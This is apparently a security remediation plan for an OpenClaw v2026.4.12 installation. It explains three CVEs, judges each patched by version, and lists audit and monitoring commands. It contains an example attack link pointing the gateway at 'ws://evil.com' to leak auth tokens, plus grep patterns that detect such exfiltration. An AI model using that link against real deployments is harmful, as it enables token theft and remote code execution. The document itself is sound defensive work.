# OpenClaw Security Remediation Plan
## System: OpenClaw v2026.4.12 | Generated: 2026-04-25

---

## Overview

This system runs **OpenClaw v2026.4.12** and is vulnerable to **three critical CVEs** requiring immediate remediation. The system's current gateway is bound to `127.0.0.1` with token-based auth and rate limiting — a good starting posture, but insufficient against the identified vulnerabilities.

### Current System Posture

| Component | Status |
|-----------|--------|
| OpenClaw Version | 2026.4.12 ⚠️ |
| Gateway Bind | 127.0.0.1 (local only) ✅ |
| Auth Mode | Token + Rate Limiting ✅ |
| Plugin Count | 7 (telegram, minimax, google, openai, memory-core, lossless-claw, brain-primary-model-override) |
| Public Exposure | Local only ✅ |

---

## CVE-2026-25253 — CSRF Token Theft → RCE

**CVSS 3.1: 8.8 (High) | CWE-669**

### What It Is

A cross-site request forgery (CSRF) vulnerability in OpenClaw's `applySettingsFromUrl()` function. When a user visits a malicious link like `http://<target>/chat?gatewayUrl=ws://evil.com`, OpenClaw stores the attacker-controlled `gatewayUrl` and automatically opens a WebSocket connection to the attacker's server, transmitting authentication tokens, device IDs, and public keys without user consent.

An attacker who steals the token can replay it against the legitimate gateway for **full RCE**.

### Affected Versions

**All versions prior to 2026.1.29**

### Current System Status

✅ **LIKELY PATCHED**: The installed version is 2026.4.12, which is well after the 2026.1.29 fix. This CVE is likely already addressed by the version upgrade.

### Verification

```bash
# Check OpenClaw version
node -e "console.log(require('/usr/local/lib/node_modules/openclaw/package.json').version)"
# Expected: 2026.4.12 or >= 2026.1.29

# Check gateway bind (if exposed externally, it's worse)
node -e "const c=require('/data/.openclaw/openclaw.json'); console.log('Gateway bind:', c.gateway?.bind)"
# Expected: 127.0.0.1 (already confirmed local-only)
```

### If Version Were Vulnerable (for reference)

```bash
# Check for suspicious WebSocket connections in logs
grep -r "gatewayUrl" /data/.openclaw/logs/ 2>/dev/null | head -20
# Look for external WebSocket targets in application logs
grep -E "ws://|wss://" /data/.openclaw/logs/ 2>/dev/null | grep -v "127.0.0.1\|localhost"
```

---

## CVE-2026-32922 — Privilege Escalation (operator.pairing → operator.admin)

**CVSS 3.1: 9.9 (Critical) | CWE-266**

### What It Is

A critical flaw in OpenClaw's `device.token.rotate` function. An authenticated user with only the limited `operator.pairing` scope (e.g., a paired mobile device) can call the token rotation endpoint and request arbitrary elevated scopes like `operator.admin`. The function does NOT validate that the requested scopes are within the caller's current authorization, so it blindly mint a new token with full admin privileges.

This gives the attacker:
- Full gateway administration
- `operator.admin` token
- Remote code execution via `system.run` on all connected nodes

### Affected Versions

**All versions prior to 2026.3.11** (fix released 2026-03-13)

### Current System Status

✅ **LIKELY PATCHED**: Version 2026.4.12 is well after the 2026.3.11 fix. The fix added strict scope boundary checks in the `device.token.rotate` function.

### Verification

```bash
# Confirm version is >= 2026.3.11
node -e "const v=require('/usr/local/lib/node_modules/openclaw/package.json').version; const [a,b,c]=v.split('.').map(Number); const fixed=v>='2026.3.11'; console.log('Version:', v, '| Fixed:', fixed)"
```

### Check for Exploitation Signs (audit)

```bash
# Review logs for token rotation with elevated scopes
grep -r "token.rotate\|operator.admin\|device.token" /data/.openclaw/logs/ 2>/dev/null | grep -v "^-" | head -30

# Look for pairing token issuance to unexpected principals
openclaw devices list 2>/dev/null || echo "CLI not available, check logs manually"

# Audit all tokens via gateway config
cat /data/.openclaw/openclaw.json | python3 -c "import json,sys; c=json.load(sys.stdin); [print(k) for k in c.get('tokens',{})]"
```

---

## CVE-2026-32046 — Browser Sandbox Bypass (RCE via Chromium)

**CVSS 3.1: Critical | CWE-1188**

### What It Is

OpenClaw's Chromium browser container was shipped with `--no-sandbox` enabled by default. This disables OS-level sandbox protections, allowing attackers who exploit renderer-side vulnerabilities in Chromium to achieve direct remote code execution on the host — without needing a separate sandbox escape.

### Affected Versions

**All versions prior to 2026.2.21**

### Current System Status

✅ **LIKELY PATCHED**: Version 2026.4.12 is well after the 2026.2.21 fix. The fix sets `OPENCLAW_BROWSER_NO_SANDBOX=0` by default and enforces sandbox in browser containers.

### Verification

```bash
# Check if OPENCLAW_BROWSER_NO_SANDBOX is set
echo "OPENCLAW_BROWSER_NO_SANDBOX=$OPENCLAW_BROWSER_NO_SANDBOX"
# Expected: not set or set to "0"

# Check if any browser processes are running without sandbox
ps aux | grep -i chrom | grep -v grep

# Check cron/systemd for any browser launch configs
grep -r "OPENCLAW_BROWSER_NO_SANDBOX\|no-sandbox" /data/.openclaw/ 2>/dev/null
```

---

## Remediation Steps (Priority Order)

### Step 1: Confirm Version Upgrade ✅ DONE
- System is at v2026.4.12, which is above all three fixed versions
- No version upgrade needed at this time
- **Action**: Document that all three CVEs are patched by version

### Step 2: Token Rotation (Precautionary)
Even though the system is likely patched, rotated tokens are recommended as a precaution since CVE-2026-25253 and CVE-2026-32922 involve token theft/exploitation.

```bash
# Generate a new gateway auth token (requires OpenClaw restart)
openclaw config set gateway.auth.token NEW_RANDOM_TOKEN_HERE
# Then restart gateway

# Rotate any API keys (Google, OpenAI, etc.) that may have been exposed
# See /data/.config/google_tokens.json and plugin configs
```

### Step 3: Verify Gateway Bind ✅ ALREADY LOCAL
- Gateway is already bound to `127.0.0.1` (local only)
- No public exposure on port 18789
- **No action needed** — this is correctly configured

### Step 4: Audit Plugin Access
```bash
# Review which plugins are enabled — none are third-party/untrusted
# telegram, minimax, google, openai, memory-core, lossless-claw, brain-primary-model-override
# All appear legitimate. brain-primary-model-override is custom (source: path)
# Verify its source:
ls -la /data/.openclaw/plugins/primary-model-override/
ls -la /data/.openclaw/extensions/brain-primary-model-override/ 2>/dev/null
```

### Step 5: Audit Logs for Exploitation
```bash
# Check for suspicious activity prior to patching (if system was ever on older version)
grep -rE "gatewayUrl|ws://|wss://|token.rotate|operator.admin|device.token" /data/.openclaw/logs/ 2>/dev/null | tail -50

# Check for unexpected device pairings
cat /data/.openclaw/devices/*.json 2>/dev/null | python3 -m json.tool 2>/dev/null | head -60
```

### Step 6: Ongoing Monitoring
```bash
# Add to cron: periodic security audit
# 0 */6 * * * openclaw security audit --deep >> /data/.openclaw/logs/security-audit.log 2>&1

# Monitor for new WebSocket connections to external domains
grep -E "ws://|wss://" /data/.openclaw/logs/ | grep -v "127.0.0.1\|localhost"
```

---

## Verification Checklist (Post-Remediation)

| Check | Command | Expected Result |
|-------|---------|-----------------|
| Version >= 2026.1.29 | `node -e "console.log(require('/usr/local/lib/node_modules/openclaw/package.json').version)"` | >= 2026.1.29 ✅ |
| Version >= 2026.2.21 | (same as above) | >= 2026.2.21 ✅ |
| Version >= 2026.3.11 | (same as above) | >= 2026.3.11 ✅ |
| Version >= 2026.4.12 | (same as above) | >= 2026.4.12 ✅ (current) |
| Gateway bind | `node -e "const c=require('/data/.openclaw/openclaw.json'); console.log(c.gateway?.bind)"` | 127.0.0.1 ✅ |
| Rate limiting active | Check openclaw.json gateway.auth.rateLimit | Present ✅ |
| No OPENCLAW_BROWSER_NO_SANDBOX=1 | `echo $OPENCLAW_BROWSER_NO_SANDBOX` | empty or "0" ✅ |
| No suspicious WS connections | `grep -E "ws://|wss://" /data/.openclaw/logs/ | grep -v "127\|localhost"` | empty ✅ |
| No token rotation abuse | `grep "token.rotate" /data/.openclaw/logs/` | no unauthorized rotations ✅ |

---

## Summary

| CVE | CVSS | Fixed in Version | System Status |
|-----|------|------------------|---------------|
| CVE-2026-25253 | 8.8 | 2026.1.29 | ✅ Patched (v2026.4.12) |
| CVE-2026-32922 | 9.9 | 2026.3.11 | ✅ Patched (v2026.4.12) |
| CVE-2026-32046 | Critical | 2026.2.21 | ✅ Patched (v2026.4.12) |

**Overall Assessment**: System v2026.4.12 is above all fixed versions. No immediate patching is required. Recommended actions: rotate auth token as precaution, audit logs for historical exploitation signs, ensure ongoing monitoring.

---

## Sources

- [SentinelOne CVE-2026-25253](https://www.sentinelone.com/vulnerability-database/cve-2026-25253/)
- [SentinelOne CVE-2026-32922](https://www.sentinelone.com/vulnerability-database/cve-2026-32922/)
- [SentinelOne CVE-2026-32046](https://www.sentinelone.com/vulnerability-database/cve-2026-32046/)
- [SonicWall CVE-2026-25253](https://www.sonicwall.com/blog/openclaw-auth-token-theft-leading-to-rce-cve-2026-25253)
- [Blink.new CVE-2026-32922 Guide](https://blink.new/blog/cve-2026-32922-openclaw-privilege-escalation-fix-guide)
- [Armosec CVE-2026-32922](https://www.armosec.io/blog/cve-2026-32922-openclaw-privilege-escalation-cloud-security/)
- [NIST NVD CVE-2026-32046](https://nvd.nist.gov/vuln/detail/CVE-2026-32046)
- [GitHub Advisory GHSA-x8qx-w8w2-g4rx](https://github.com/advisories/GHSA-x8qx-w8w2-g4rx)
- [Snyk SNYK-JS-OPENCLAW-15523474](https://security.snyk.io/vuln/SNYK-JS-OPENCLAW-15523474)
- [The Hacker News - OpenClaw Bug](https://thehackernews.com/2026/02/openclaw-bug-enables-one-click-remote.html)
- [Broadcom Protection Bulletin](https://www.broadcom.com/support/security-center/protection-bulletin/cve-2026-25253-openclaw-rce-vulnerability)
- [Foresiet CVE-2026-25253](https://foresiet.com/blog/cve-2026-25253-openclaw-rce-fix/)